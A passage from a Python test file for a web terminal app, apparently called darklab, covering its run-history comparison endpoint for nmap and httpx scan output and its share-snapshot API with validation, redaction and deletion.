                        "cmp-web-left",
                        session,
                        "httpx -u https://darklab.sh -status-code -title",
                        "2026-01-01T00:00:10",
                        "2026-01-01T00:00:11",
                        0,
                        left_web_output,
                        2,
                    ),
                    (
                        "cmp-web-right",
                        session,
                        "httpx -u https://darklab.sh -status-code -title",
                        "2026-01-01T00:00:12",
                        "2026-01-01T00:00:13",
                        0,
                        right_web_output,
                        2,
                    ),
                ],
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 8080', '8080/tcp open http-proxy', 1, ?, datetime('now'))",
                ("cmp-finding-left", session, "cmp-left", "cmp-fp-left"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 443', '443/tcp open https', 1, ?, datetime('now'))",
                ("cmp-finding-right", session, "cmp-right", "cmp-fp-right"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 10, 'workspace_flag', datetime('now'))",
                ("cmp-artifact-left", session, "cmp-left"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 12, 'workspace_flag', datetime('now'))",
                ("cmp-artifact-right", session, "cmp-right"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-left&right=cmp-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["left"]["command"] == "nmap darklab.sh"
            assert data["right"]["duration_seconds"] == 5
            assert data["deltas"]["duration_seconds"]["delta"] == 3
            assert data["deltas"]["findings"]["delta"] == 0
            assert data["totals"] == {
                "left_total_lines": 3,
                "right_total_lines": 3,
                "equal_line_count": 1,
                "changed_line_count": 2,
                "added_line_count": 0,
                "removed_line_count": 0,
            }
            assert [hunk["op"] for hunk in data["hunks"]] == ["replace", "equal", "replace"]
            assert data["limits"]["max_changed_lines"] == 2000
            assert data["limits"]["minimap_buckets"] == 256
            assert len(data["density_buckets"]) == 256
            assert sum(
                bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
                for bucket in data["density_buckets"]
            ) == (
                data["totals"]["equal_line_count"]
                + data["totals"]["changed_line_count"]
                + data["totals"]["added_line_count"]
                + data["totals"]["removed_line_count"]
            )
            assert "sections" not in data
            first_hunk = data["hunks"][0]
            first_pair = first_hunk["changed_pairs"][0]
            first_left = first_hunk["left"]["lines"][first_pair["left_index"]]
            first_right = first_hunk["right"]["lines"][first_pair["right_index"]]
            assert first_left["text"].endswith("23:22 UTC")
            assert first_right["text"].endswith("23:21 UTC")
            assert any(segment["changed"] for segment in first_pair["segments"]["left"])
            assert any(segment["changed"] for segment in first_pair["segments"]["right"])
            final_hunk = data["hunks"][2]
            final_pair = final_hunk["changed_pairs"][0]
            final_left = final_hunk["left"]["lines"][final_pair["left_index"]]
            final_right = final_hunk["right"]["lines"][final_pair["right_index"]]
            assert final_left["text"] == "8080/tcp open http-proxy"
            assert final_right["text"] == "443/tcp open https"
            hunk_texts = []
            for hunk in data["hunks"]:
                hunk_texts.extend(
                    line["text"] for line in hunk.get("left", {}).get("lines", [])
                )
                hunk_texts.extend(
                    line["text"] for line in hunk.get("right", {}).get("lines", [])
                )
            assert all("process exited" not in text for text in hunk_texts)
            assert [item["raw_line"] for item in data["objects"]["findings"]["added"]] == ["443/tcp open https"]
            assert [item["raw_line"] for item in data["objects"]["findings"]["removed"]] == ["8080/tcp open http-proxy"]
            assert data["objects"]["findings"]["added"][0]["line_number"] == 1
            assert data["objects"]["findings"]["added"][0]["compare_line_index"] == 2
            assert data["objects"]["findings"]["removed"][0]["line_number"] == 1
            assert data["objects"]["findings"]["removed"][0]["compare_line_index"] == 2
            assert [item["workspace_path"] for item in data["objects"]["artifacts"]["added"]] == ["reports/right.txt"]
            assert [item["workspace_path"] for item in data["objects"]["artifacts"]["removed"]] == ["reports/left.txt"]
            assert "compare_line_index" not in data["objects"]["artifacts"]["added"][0]
            derived_changes = data["derived_changes"]
            assert derived_changes["group_count"] == 1
            assert derived_changes["changed_count"] == 2
            assert derived_changes["truncated"] is False
            port_group = derived_changes["groups"][0]
            assert port_group["id"] == "nmap_ports"
            assert port_group["kind"] == "ports"
            assert port_group["display_target"] == "darklab.sh"
            assert port_group["added_count"] == 1
            assert port_group["removed_count"] == 1
            assert port_group["changed_count"] == 0
            assert port_group["added"][0]["key"] == "443/tcp"
            assert port_group["added"][0]["compare_line_index"] == 2
            assert port_group["added"][0]["compare_side"] == "right"
            assert port_group["removed"][0]["key"] == "8080/tcp"
            assert port_group["removed"][0]["compare_line_index"] == 2
            assert port_group["removed"][0]["compare_side"] == "left"

            web_resp = client.get(
                "/history/compare?left=cmp-web-left&right=cmp-web-right",
                headers={"X-Session-ID": session},
            )
            web_data = json.loads(web_resp.data)
            assert web_resp.status_code == 200
            web_group = web_data["derived_changes"]["groups"][0]
            assert web_group["id"] == "web_urls"
            assert web_group["kind"] == "urls"
            assert web_group["display_target"] == "darklab.sh"
            assert web_group["added_count"] == 1
            assert web_group["removed_count"] == 1
            assert web_group["changed_count"] == 1
            assert web_group["added"][0]["canonical_url"] == "https://darklab.sh/admin"
            assert web_group["added"][0]["status_code"] == 200
            assert web_group["added"][0]["compare_line_index"] == 1
            assert web_group["removed"][0]["canonical_url"] == "https://darklab.sh/login"
            assert web_group["removed"][0]["status_code"] == 404
            assert web_group["changed"][0]["key"] == "https://darklab.sh"
            assert web_group["changed"][0]["before"]["status_code"] == 200
            assert web_group["changed"][0]["before"]["title"] == "Old title"
            assert web_group["changed"][0]["after"]["status_code"] == 301
            assert web_group["changed"][0]["after"]["title"] == "New title"
            assert web_data["objects"]["entities"]["added"][0]["canonical_value"] == "https://darklab.sh/admin"
            assert web_data["objects"]["entities"]["removed"][0]["canonical_value"] == "https://darklab.sh/login"

            with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
                capped_resp = client.get(
                    "/history/compare?left=cmp-left&right=cmp-right",
                    headers={"X-Session-ID": session},
                )
            capped = json.loads(capped_resp.data)
            assert capped_resp.status_code == 200
            assert capped["left"]["persisted_finding_count"] == 1
            assert capped["right"]["persisted_finding_count"] == 1
            assert capped["left"]["artifact_count"] == 1
            assert capped["right"]["artifact_count"] == 1
            assert capped["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
            assert capped["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
            assert capped["truncated"]["findings"] == {"left": True, "right": True}
            assert capped["truncated"]["artifacts"] == {"left": True, "right": True}
            assert capped["truncated"]["item_limit"] == 0

            with mock.patch("services.runs.comparison.COMPARE_MAX_CHANGED_LINES", 2):
                line_limited_resp = client.get(
                    "/history/compare?left=cmp-left&right=cmp-right",
                    headers={"X-Session-ID": session},
                )
            line_limited = json.loads(line_limited_resp.data)
            assert line_limited_resp.status_code == 200
            assert line_limited["truncated"]["changed_lines"] is True
            assert line_limited["truncated"]["hunks_omitted"] == 1
            assert line_limited["truncated"]["lines_omitted"] == {
                "left": 1,
                "right": 1,
                "total": 2,
            }
            assert line_limited["totals"]["changed_line_count"] == 1
            assert line_limited["totals"]["added_line_count"] == 0
            assert line_limited["totals"]["removed_line_count"] == 0
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM run_file_artifacts WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_handles_invalid_requests_and_identical_runs(self):
        client = get_client()
        session = "compare-errors-" + uuid.uuid4().hex[:8]
        output = json.dumps([
            {"text": "same header", "cls": "", "line_index": 0},
            {"text": "80/tcp open http", "cls": "", "line_index": 1},
        ])
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, 'nmap darklab.sh', ?, ?, 0, ?, 2)",
                [
                    ("cmp-errors-left", session, "2026-01-01T00:00:01", "2026-01-01T00:00:03", output),
                    ("cmp-errors-right", session, "2026-01-01T00:00:04", "2026-01-01T00:00:06", output),
                ],
            )
            conn.commit()
            conn.close()

            missing_left = client.get(
                "/history/compare?right=cmp-errors-right",
                headers={"X-Session-ID": session},
            )
            missing_right = client.get(
                "/history/compare?left=cmp-errors-left",
                headers={"X-Session-ID": session},
            )
            same_run = client.get(
                "/history/compare?left=cmp-errors-left&right=cmp-errors-left",
                headers={"X-Session-ID": session},
            )
            missing_run = client.get(
                "/history/compare?left=cmp-errors-left&right=missing-run",
                headers={"X-Session-ID": session},
            )
            identical = client.get(
                "/history/compare?left=cmp-errors-left&right=cmp-errors-right",
                headers={"X-Session-ID": session},
            )

            assert missing_left.status_code == 400
            assert missing_right.status_code == 400
            assert same_run.status_code == 400
            assert missing_run.status_code == 404
            assert identical.status_code == 200
            identical_payload = json.loads(identical.data)
            assert identical_payload["totals"]["changed_line_count"] == 0
            assert identical_payload["totals"]["added_line_count"] == 0
            assert identical_payload["totals"]["removed_line_count"] == 0
            assert identical_payload["objects"]["findings"] == {
                "added": [],
                "removed": [],
                "unchanged_count": 0,
            }
            assert identical_payload["objects"]["artifacts"] == {
                "added": [],
                "removed": [],
                "unchanged_count": 0,
            }
            assert identical_payload["truncated"]["changed_lines"] is False
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_matches_findings_by_normalized_text_not_order_or_fingerprint(self):
        client = get_client()
        session = "compare-findings-order-" + uuid.uuid4().hex[:8]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, 0, '[]', 0)",
                [
                    ("cmp-findings-left", session, "nmap darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:03"),
                    ("cmp-findings-right", session, "nmap darklab.sh", "2026-01-01T00:00:04", "2026-01-01T00:00:06"),
                ],
            )
            conn.executemany(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                [
                    (
                        "cmp-finding-left-80",
                        session,
                        "cmp-findings-left",
                        "80/tcp open http",
                        "80/tcp open http",
                        0,
                        "left-fingerprint-80",
                    ),
                    (
                        "cmp-finding-left-443",
                        session,
                        "cmp-findings-left",
                        "443/tcp open https",
                        "443/tcp open https",
                        1,
                        "left-fingerprint-443",
                    ),
                    (
                        "cmp-finding-right-443",
                        session,
                        "cmp-findings-right",
                        "443/tcp open https",
                        "\x1b[32m443/tcp   open   https\x1b[0m",
                        0,
                        "right-fingerprint-443",
                    ),
                    (
                        "cmp-finding-right-80",
                        session,
                        "cmp-findings-right",
                        "80/tcp open http",
                        "80/tcp open http",
                        1,
                        "right-fingerprint-80",
                    ),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-findings-left&right=cmp-findings-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["objects"]["findings"]["added"] == []
            assert data["objects"]["findings"]["removed"] == []
            assert data["objects"]["findings"]["unchanged_count"] == 2
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_compare_history_runs_leaves_very_long_lines_unpaired(self):
        client = get_client()
        session = "compare-long-lines-" + uuid.uuid4().hex[:8]
        left_line = "scanner output " + ("a" * 4500) + " old"
        right_line = "scanner output " + ("a" * 4500) + " new"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
                "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    (
                        "cmp-long-left",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:01",
                        "2026-01-01T00:00:03",
                        0,
                        json.dumps([{"text": left_line, "cls": "", "line_index": 0}]),
                        1,
                    ),
                    (
                        "cmp-long-right",
                        session,
                        "nmap darklab.sh",
                        "2026-01-01T00:00:04",
                        "2026-01-01T00:00:09",
                        0,
                        json.dumps([{"text": right_line, "cls": "", "line_index": 0}]),
                        1,
                    ),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/compare?left=cmp-long-left&right=cmp-long-right",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["hunks"][0]["op"] == "replace"
            assert data["hunks"][0]["changed_pairs"] == []
            assert data["hunks"][0]["left_unpaired"] == [0]
            assert data["hunks"][0]["right_unpaired"] == [0]
            assert "sections" not in data
            left_unpaired = [
                data["hunks"][0]["left"]["lines"][index]["text"]
                for index in data["hunks"][0]["left_unpaired"]
            ]
            right_unpaired = [
                data["hunks"][0]["right"]["lines"][index]["text"]
                for index in data["hunks"][0]["right_unpaired"]
            ]
            assert left_unpaired == [left_line]
            assert right_unpaired == [right_line]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()


# ── /share ────────────────────────────────────────────────────────────────────

class TestShareRoute:
    def test_post_creates_snapshot(self):
        client = get_client()
        with mock.patch.dict(config.CFG, {"share_redaction_enabled": True}, clear=False):
            resp = client.post(
                "/share",
                json={"label": "test snapshot", "content": ["line1", "line2"], "apply_redaction": True},
                headers={"X-Session-ID": "test-session"}
            )
            assert resp.status_code == 200
            data = json.loads(resp.data)
            assert "id" in data
            assert "url" in data

            delete = client.delete(f"/share/{data['id']}", headers={"X-Session-ID": "test-session"})
            assert delete.status_code == 200

        audit_rows = _audit_event_rows(target_id=data["id"])
        assert [row["event_type"] for row in audit_rows] == [
            "snapshot.create",
            "redaction.use",
            "snapshot.delete",
        ]
        assert audit_rows[0]["details"]["safe_label"] == "test snapshot"

    def test_post_can_offload_large_snapshot_content_and_restore_it(self):
        from services.storage import body_store

        client = get_client()
        session_id = "share-offload-" + uuid.uuid4().hex[:8]
        content = [{"text": "line " + ("x" * 64), "cls": "notice"}]
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(body_store, "DATA_DIR", tmp), \
             mock.patch.dict("config.CFG", {"snapshots_inline_max_bytes": 1}):
            create_resp = client.post(
                "/share",
                json={"label": "large snapshot", "content": content},
                headers={"X-Session-ID": session_id},
            )
            share_id = json.loads(create_resp.data)["id"]
            with db_connect() as conn:
                stored = conn.execute(
                    "SELECT content FROM snapshots WHERE id = ?",
                    (share_id,),
                ).fetchone()["content"]
            pointer = body_store.stored_body_pointer(stored)
            assert pointer is not None
            body_path = os.path.join(tmp, pointer["rel_path"])
            assert os.path.exists(body_path)

            fetch_resp = client.get(f"/share/{share_id}?json", headers={"X-Session-ID": session_id})
            delete_resp = client.delete(f"/share/{share_id}", headers={"X-Session-ID": session_id})

            assert fetch_resp.status_code == 200
            assert json.loads(fetch_resp.data)["content"] == content
            assert delete_resp.status_code == 200
            assert not os.path.exists(body_path)

    def test_post_does_not_link_snapshot_to_source_run_project(self):
        client = get_client()
        session = "share-project-" + uuid.uuid4().hex[:8]
        run_id = "run-" + uuid.uuid4().hex
        project_resp = client.post(
            "/projects",
            json={"name": "Snapshot Source"},
            headers={"X-Session-ID": session},
        )
        project = json.loads(project_resp.data)["project"]
        conn = sqlite3.connect(DB_PATH)
        try:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (run_id, session, "theme list"),
            )
            conn.commit()
        finally:
            conn.close()
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id, "source": "manual"},
            headers={"X-Session-ID": session},
        )
        assert link_resp.status_code == 201

        resp = client.post(
            "/share",
            json={"label": "linked snapshot", "content": ["line1"], "run_id": run_id},
            headers={"X-Session-ID": session},
        )
        assert resp.status_code == 200
        assert "id" in json.loads(resp.data)

        conn = sqlite3.connect(DB_PATH)
        try:
            row = conn.execute(
                "SELECT entity_type, entity_id, source FROM project_links "
                "WHERE project_id = ? AND entity_type = 'snapshot'",
                (project["id"],),
            ).fetchone()
        finally:
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()
        assert row is None

    def test_post_rejects_non_string_label(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": 123, "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Label must be a string"

    def test_post_rejects_non_list_content(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": {"text": "line"}},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content must be a list"

    def test_post_rejects_invalid_content_item(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": ["ok", 123]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content items must be strings or objects"

    def test_post_rejects_content_object_without_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_text(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": 123, "cls": "notice"}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must include a string text field"

    def test_post_rejects_content_object_with_non_string_cls(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={"label": "bad content", "content": [{"text": "hello", "cls": 123}]},
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Content objects must use string cls values"

    def test_post_accepts_renderable_content_objects(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "good content",
                "content": [
                    {"text": "$ echo hi", "cls": "cmd", "tsC": "2026-01-01 00:00:00"},
                    {"text": "hi", "cls": "notice"},
                ],
            },
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert "id" in data

    def test_post_applies_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [
                {"pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": ""},
            ],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "good content",
                    "content": [
                        {"text": "Authorization: Bearer abc123", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "Authorization: Bearer [redacted]"

    def test_post_applies_builtin_share_redaction_rules_before_persisting_snapshot(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "builtin redaction",
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact [email-redacted] at [ip-redacted]"

    def test_post_skips_share_redaction_when_apply_redaction_false(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            create_resp = client.post(
                "/share",
                json={
                    "label": "raw share",
                    "apply_redaction": False,
                    "content": [
                        {"text": "contact admin@example.com at 203.0.113.10", "cls": "notice"},
                    ],
                },
                headers={"X-Session-ID": "test-session"},
            )
            share_id = json.loads(create_resp.data)["id"]
            fetch = client.get(f"/share/{share_id}?json")
        data = json.loads(fetch.data)
        assert data["content"][0]["text"] == "contact admin@example.com at 203.0.113.10"

    def test_post_rejects_non_boolean_apply_redaction(self):
        client = get_client()
        resp = client.post(
            "/share",
            json={
                "label": "bad share",
                "apply_redaction": "yes",
                "content": [{"text": "line 1", "cls": ""}],
            },
            headers={"X-Session-ID": "test-session"},
        )
        assert resp.status_code == 400
        data = json.loads(resp.data)
        assert data["error"] == "apply_redaction must be a boolean"

    def test_post_rejects_non_object_json(self):
        client = get_client()
        resp = client.post(
            "/share",
            json=["bad", "payload"],
            headers={"X-Session-ID": "test-session"}
        )
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Request body must be a JSON object"

    def test_get_nonexistent_share_returns_404(self):
        client = get_client()
        resp = client.get("/share/nonexistent-share-id")
        assert resp.status_code == 404

    def test_delete_share_removes_snapshot_for_current_session(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "delete-me", "content": ["line"]},
            headers={"X-Session-ID": "delete-share-session"},
        )
        share_id = json.loads(create_resp.data)["id"]
        label_resp = client.post(
            f"/entities/snapshot/{share_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": "delete-share-session"},
        )
        note_resp = client.put(
            f"/entities/snapshot/{share_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": "delete-share-session"},
        )
        assert label_resp.status_code == 201
        assert note_resp.status_code == 200

        resp = client.delete(
            f"/share/{share_id}",
            headers={"X-Session-ID": "delete-share-session"},
        )

        assert resp.status_code == 200
        assert json.loads(resp.data) == {"ok": True}
        assert client.get(f"/share/{share_id}").status_code == 404
        with sqlite3.connect(DB_PATH) as conn:
            label_count = conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
            note_count = conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
        assert label_count == 0
        assert note_count == 0

    def test_bulk_delete_shares_reports_partial_results_and_removes_metadata(self):
        client = get_client()
        session_id = "bulk-delete-share-session"
        other_session_id = "bulk-delete-share-other"

        create_resp = client.post(
            "/share",
            json={"label": "delete-me", "content": ["line"]},
            headers={"X-Session-ID": session_id},
        )
        share_id = json.loads(create_resp.data)["id"]
        other_resp = client.post(
            "/share",
            json={"label": "keep-me", "content": ["line"]},
            headers={"X-Session-ID": other_session_id},
        )
        other_share_id = json.loads(other_resp.data)["id"]
        label_resp = client.post(
            f"/entities/snapshot/{share_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        note_resp = client.put(
            f"/entities/snapshot/{share_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": session_id},
        )
        assert label_resp.status_code == 201
        assert note_resp.status_code == 200

        resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [share_id, other_share_id, "missing-share"]},
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["counts"] == {"deleted": 1, "not_found": 2, "rejected": 0}
        assert data["results"] == [
            {"snapshot_id": share_id, "status": "deleted"},
            {"snapshot_id": other_share_id, "status": "not_found"},
            {"snapshot_id": "missing-share", "status": "not_found"},
        ]
        with sqlite3.connect(DB_PATH) as conn:
            remaining_ids = {
                row[0]
                for row in conn.execute(
                    "SELECT id FROM snapshots WHERE id IN (?, ?)",
                    (share_id, other_share_id),
                ).fetchall()
            }
            label_count = conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
            note_count = conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type='snapshot' AND entity_id=?",
                (share_id,),
            ).fetchone()[0]
        assert remaining_ids == {other_share_id}
        assert label_count == 0
        assert note_count == 0

    def test_bulk_delete_shares_rejects_malformed_ids(self):
        client = get_client()
        session_id = "bulk-delete-share-malformed"
        overlong_id = "s" * 513

        non_string_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": ["snap-ok", {"bad": "id"}]},
            headers={"X-Session-ID": session_id},
        )
        assert non_string_resp.status_code == 400
        assert json.loads(non_string_resp.data) == {"error": "snapshot_ids entries must be strings"}

        overlong_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [overlong_id]},
            headers={"X-Session-ID": session_id},
        )
        assert overlong_resp.status_code == 400
        assert json.loads(overlong_resp.data) == {"error": "snapshot_ids entries are too long", "limit": 512}

        too_many_resp = client.post(
            "/share/bulk-delete",
            json={"snapshot_ids": [f"snap-{index}" for index in range(101)]},
            headers={"X-Session-ID": session_id},
        )
        assert too_many_resp.status_code == 400
        assert json.loads(too_many_resp.data) == {"error": "too_many", "limit": 100}

    def test_get_share_json_returns_content(self):
        client = get_client()
        # Create a snapshot first
        create_resp = client.post(
            "/share",
            json={"label": "my label", "content": ["hello", "world"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]

        # Fetch it as JSON
        resp = client.get(f"/share/{share_id}?json")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["label"] == "my label"
        assert "hello" in data["content"]

    def test_get_share_html_returns_page(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "html test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert resp.status_code == 200
        assert b"<html" in resp.data.lower()

    def test_get_share_html_honors_theme_name_cookie(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "theme selector test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        client.set_cookie("pref_theme_name", "apricot_sand")
        resp = client.get(f"/share/{share_id}")
        body = resp.get_data(as_text=True)
        assert 'class="permalink-page"' in body
        assert 'data-theme="apricot_sand"' in body
        assert '/static/css/core/base.css?v=' in body
        assert '/static/css/features/history.css?v=' in body
        assert '/static/css/terminal_export.css?v=' in body
        assert 'type="module" src="/static/js/permalink.entry.js?v=' in body
        assert "__darklabBootstrapAsset" in body
        assert "ESM_BOOTSTRAP_LOAD_FAILED" in body
        assert "window.__darklabBootstrapAsset.start('permalink', 'permalink'," in body
        assert (
            "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)"
            in body
        )
        assert '/static/js/core/utils.js?v=' not in body
        assert '/static/js/permalink.js?v=' not in body

    def test_get_share_html_bundle_mode_renders_per_page_asset_bundles(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "bundle mode test", "content": ["line"]},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
            body = client.get(f"/share/{share_id}").get_data(as_text=True)
        assert re.search(r'href="/static/build/app\.[a-f0-9]{12}\.css"', body)
        assert re.search(r'href="/static/build/terminal-export\.[a-f0-9]{12}\.css"', body)
        assert re.search(r'type="module" src="/static/build/permalink\.[a-f0-9]{12}\.js"', body)
        assert "window.__darklabBootstrapAsset.start('permalink', 'permalink'," in body
        assert (
            "window.__darklabBootstrapAsset.failed('permalink', 'permalink', this.src, event)"
            in body
        )
        assert '/static/css/core/base.css?v=' not in body
        assert '/static/css/features/history.css?v=' not in body
        assert '/static/css/terminal_export.css?v=' not in body
        assert '/static/js/core/utils.js?v=' not in body
        assert '/static/js/permalink.js?v=' not in body

    def test_get_share_html_contains_label(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={"label": "unique-label-xyz", "content": []},
            headers={"X-Session-ID": "test-session"}
        )
        share_id = json.loads(create_resp.data)["id"]
        resp = client.get(f"/share/{share_id}")
        assert b"unique-label-xyz" in resp.data

    def test_get_share_html_does_not_prepend_label_for_structured_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "curl http://localhost:5001/config",
                "content": [
                    {"text": "$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
                    {"text": "PING darklab.sh (93.184.216.34): 56 data bytes", "cls": ""},
                    {"text": "[process exited with code 0 in 0.1s]", "cls": "exit-ok"},
                ],
            },
            headers={"X-Session-ID": "test-session"},
        )
        share_id = json.loads(create_resp.data)["id"]

        resp = client.get(f"/share/{share_id}")

        assert resp.status_code == 200
        body = resp.get_data(as_text=True)
        assert "$ ping -c 4 [host-redacted]" in body
        assert "$ curl http://localhost:5001/config" not in body

    def test_get_share_html_includes_prompt_echo_renderer_for_snapshot_content(self):
        client = get_client()
        create_resp = client.post(
            "/share",
            json={
                "label": "prompt-style-test",
                "content": [
                    {"text": "anon@darklab:~$ ping -c 4 darklab.sh", "cls": "prompt-echo"},
